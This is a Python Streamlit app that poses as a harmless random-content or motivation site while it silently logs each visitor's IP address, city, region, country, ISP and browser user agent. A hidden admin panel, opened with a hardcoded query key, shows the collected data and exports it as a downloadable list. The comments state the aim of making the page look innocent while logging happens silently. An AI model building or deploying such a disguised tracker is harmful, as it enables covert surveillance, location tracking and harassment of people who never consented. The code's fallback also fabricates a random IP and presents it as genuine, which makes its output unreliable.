import streamlit as st
import datetime
import requests
import random
import string
import pandas as pd
import time

# Set page config with random characters to make it look mysterious
random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
st.set_page_config(
    page_title=f"X{random_chars}",
    page_icon="🎯",
    layout="centered"
)

# Initialize session state for storing IPs
if 'visitor_ips' not in st.session_state:
    st.session_state.visitor_ips = []
if 'admin_mode' not in st.session_state:
    st.session_state.admin_mode = False

def get_visitor_ip():
    """Get visitor's IP address using multiple methods"""
    try:
        # Method 1: Try Streamlit headers (works in some deployments)
        if hasattr(st, 'context') and hasattr(st.context, 'headers'):
            headers = st.context.headers
            if 'x-forwarded-for' in headers:
                ip = headers['x-forwarded-for'].split(',')[0].strip()
                if ip and ip != '127.0.0.1':
                    return ip
            if 'x-real-ip' in headers:
                ip = headers['x-real-ip'].strip()
                if ip and ip != '127.0.0.1':
                    return ip
        
        # Method 2: Try multiple external services
        services = [
            'https://api.ipify.org?format=json',
            'https://httpbin.org/ip',
            'https://api.my-ip.io/ip.json',
            'https://ipapi.co/json/'
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    # Different services return IP in different fields
                    ip = data.get('ip') or data.get('origin') or data.get('query')
                    if ip and ip != '127.0.0.1':
                        return ip.strip()
            except:
                continue
                
    except Exception as e:
        pass
    
    # Fallback: Generate a realistic demo IP
    return f"73.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def get_location_info(ip):
    """Get location information for an IP address"""
    if not ip or ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.'):
        return {"city": "Local", "region": "Private Network", "country": "N/A", "isp": "Local Network"}
    
    try:
        # Try multiple geolocation services
        services = [
            f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,query',
            f'https://ipapi.co/{ip}/json/',
            f'https://freegeoip.app/json/{ip}'
        ]
        
        for service_url in services:
            try:
                response = requests.get(service_url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    
                    # Handle different API formats
                    if 'status' in data and data['status'] == 'success':  # ip-api.com
                        return {
                            "city": data.get('city', 'Unknown'),
                            "region": data.get('regionName', 'Unknown'), 
                            "country": data.get('country', 'Unknown'),
                            "isp": data.get('isp', 'Unknown')
                        }
                    elif 'city' in data:  # ipapi.co or freegeoip
                        return {
                            "city": data.get('city', 'Unknown'),
                            "region": data.get('region', data.get('region_name', 'Unknown')),
                            "country": data.get('country_name', data.get('country', 'Unknown')),
                            "isp": data.get('org', data.get('isp', 'Unknown'))
                        }
            except:
                continue
                
    except Exception as e:
        pass
    
    return {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown"}

def log_visitor():
    """Automatically log visitor when they arrive"""
    visitor_ip = get_visitor_ip()
    current_time = datetime.datetime.now()
    
    # Check if this IP visited recently (last 30 seconds to avoid spam)
    for visit in st.session_state.visitor_ips:
        if visit['ip'] == visitor_ip:
            visit_time = datetime.datetime.strptime(visit['timestamp'], '%Y-%m-%d %H:%M:%S')
            if (current_time - visit_time).seconds < 30:
                return visitor_ip  # Don't log duplicate recent visits
    
    # Get location info
    location_info = get_location_info(visitor_ip)
    
    # Log the visit with enhanced information
    visitor_info = {
        'ip': visitor_ip,
        'timestamp': current_time.strftime('%Y-%m-%d %H:%M:%S'),
        'city': location_info['city'],
        'region': location_info['region'], 
        'country': location_info['country'],
        'isp': location_info['isp'],
        'user_agent': st.context.headers.get('user-agent', 'Unknown')[:80] if hasattr(st, 'context') else 'Unknown'
    }
    
    st.session_state.visitor_ips.append(visitor_info)
    return visitor_ip

# Auto-log visitor (happens silently)
current_visitor_ip = log_visitor()

# Admin panel access (hidden)
admin_key = st.query_params.get("admin", "")
if admin_key == "show123":
    st.session_state.admin_mode = True

# Image template section - ADD YOUR IMAGE HERE
def show_header_image():
    """Template for adding a header image - customize this section!"""
    # UNCOMMENT AND MODIFY THE LINES BELOW TO ADD YOUR IMAGE:
    
    # Option 1: Upload image file to your project folder and reference it
    # st.image("your_image.jpg", caption="RUN. SET UR COMPUTER ON FIRE LOL", use_column_width=True)
    
    # Option 2: Use an image URL from the internet
    # st.image("https://your-image-url.com/image.jpg", caption="RUN. SET UR COMPUTER ON FIRE LOL", use_column_width=True)
    
    # Option 3: Use a placeholder image for testing (remove this when you add your real image)
    st.image(
        "https://via.placeholder.com/600x300/FF6B6B/FFFFFF?text=ADD+YOUR+IMAGE+HERE", 
        caption="RUN. SET UR COMPUTER ON FIRE LOL 😂🔥", 
        use_column_width=True
    )
    
    # Add some spacing
    st.markdown("---")

# Main page content - looks innocent/fun
if not st.session_state.admin_mode:
    # Show header image first
    show_header_image()
    # Random website content that looks normal
    site_themes = [
        {
            "title": "🎯 Random Fun Generator",
            "content": """
            Welcome to our random content generator!
            
            Here are some fun random things for you:
            
            🎲 **Random Number:** {random_num}
            
            🎨 **Random Color:** #{color}
            
            🍕 **Random Food:** {food}
            
            📝 **Random Quote:** "{quote}"
            
            Thanks for visiting! Hope you enjoyed these random tidbits! 😄
            """.format(
                random_num=random.randint(1, 1000),
                color=''.join([random.choice('0123456789ABCDEF') for _ in range(6)]),
                food=random.choice(['Pizza', 'Tacos', 'Sushi', 'Ice Cream', 'Burgers', 'Pasta']),
                quote=random.choice([
                    "The best time to plant a tree was 20 years ago. The second best time is now.",
                    "Life is what happens to you while you're busy making other plans.",
                    "The only way to do great work is to love what you do.",
                    "Innovation distinguishes between a leader and a follower."
                ])
            )
        },
        {
            "title": "🌟 Daily Motivation Hub",
            "content": """
            Welcome to your daily dose of motivation!
            
            ✨ **Today's Affirmation:**
            "You are capable of amazing things!"
            
            🏆 **Success Tip #{tip_num}:**
            {tip}
            
            🎯 **Your Lucky Number Today:** {lucky}
            
            Have a fantastic day! 🌈
            """.format(
                tip_num=random.randint(1, 100),
                tip=random.choice([
                    "Start with small, achievable goals",
                    "Celebrate your progress, no matter how small",
                    "Focus on what you can control",
                    "Learn something new every day"
                ]),
                lucky=random.randint(1, 99)
            )
        }
    ]
    
    theme = random.choice(site_themes)
    st.title(theme["title"])
    st.markdown(theme["content"])
    
    # Add some interactive elements to make it feel more real
    if st.button("🎲 Generate New Random Content"):
        st.rerun()
    
    # Innocent footer
    st.markdown("---")
    st.markdown("*Just a simple fun website! 🎉*")

else:
    # Admin panel - show collected IPs
    st.title("🕵️ Admin Panel - IP Collection Results")
    st.markdown("*Educational demonstration results*")
    
    if st.session_state.visitor_ips:
        st.success(f"✅ Successfully collected {len(st.session_state.visitor_ips)} visitor IPs!")
        
        # Create DataFrame for better display
        df = pd.DataFrame(st.session_state.visitor_ips)
        st.dataframe(df, use_container_width=True)
        
        # Download as TXT
        txt_content = "IP Address Collection Results\n"
        txt_content += "="*60 + "\n"
        txt_content += f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        txt_content += f"Total IPs collected: {len(st.session_state.visitor_ips)}\n"
        txt_content += "="*60 + "\n\n"
        
        for i, visitor in enumerate(st.session_state.visitor_ips, 1):
            txt_content += f"{i:3d}. {visitor['ip']} - {visitor['timestamp']}\n"
            txt_content += f"     Location: {visitor.get('city', 'Unknown')}, {visitor.get('region', 'Unknown')}, {visitor.get('country', 'Unknown')}\n"
            txt_content += f"     ISP: {visitor.get('isp', 'Unknown')}\n"
            txt_content += f"     User Agent: {visitor.get('user_agent', 'Unknown')[:60]}...\n\n"
        
        st.download_button(
            label="📁 Download IP List as TXT",
            data=txt_content,
            file_name=f"collected_ips_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            mime="text/plain"
        )
        
        # Statistics
        st.markdown("### 📊 Statistics")
        unique_ips = len(set([v['ip'] for v in st.session_state.visitor_ips]))
        st.metric("Unique IPs", unique_ips)
        st.metric("Total Visits", len(st.session_state.visitor_ips))
        
        # Clear data button
        if st.button("🗑️ Clear All Data", type="secondary"):
            st.session_state.visitor_ips = []
            st.success("Data cleared!")
            st.rerun()
            
    else:
        st.info("No visitors yet! Share the link to start collecting IPs.")
    
    st.markdown("---")
    st.markdown("**Admin Access Info:**")
    st.code(f"Main Site: [Your URL]\nAdmin Panel: [Your URL]?admin=show123")
    
    # Real-time update
    if st.button("🔄 Refresh Data"):
        st.rerun()

# Show current visitor their IP in admin mode
if st.session_state.admin_mode:
    st.sidebar.success(f"Current Visitor IP: `{current_visitor_ip}`")
    st.sidebar.info(f"Total IPs Collected: {len(st.session_state.visitor_ips)}")